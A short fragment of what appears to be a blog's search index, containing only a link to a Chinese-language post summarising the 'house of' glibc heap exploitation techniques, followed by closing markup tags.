<p><a href="https://www.roderickchan.cn/zh-cn/2023-02-27-house-of-all-about-glibc-heap-exploitation/"><strong>Glibc 堆利用之 house of 系列总结</strong></a></p>
]]></content>
  </entry>
</search>
